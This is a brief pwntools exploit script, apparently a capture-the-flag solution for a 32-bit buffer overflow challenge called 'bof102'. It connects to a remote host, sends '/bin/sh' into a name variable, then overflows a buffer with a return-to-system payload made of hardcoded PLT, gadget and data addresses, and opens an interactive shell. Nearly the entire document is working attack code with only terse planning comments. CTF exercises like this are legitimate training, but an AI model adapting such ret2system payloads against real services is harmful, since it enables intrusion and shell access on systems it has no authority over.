# Ideas
### store the /bin/sh on name variable
### find system PLT & name variable address
### no need RDI, bcz its 32 bit

### buffer, system, ret, name (/bin/sh)


from pwn import *

binary = "./bof102"
elf = context.binary = ELF(binary)
#p = process(binary)
p = remote("bof102.sstf.site",1337)

system = p32(0x8048430) # call system PLT

payload = b"A"*20
payload += system
payload += p32(0x080483ca) #ret
payload += p32(0x0804a06c)


p.recv()
p.sendline(b"/bin/sh")
p.sendline(payload)
print(p.recv())
p.interactive()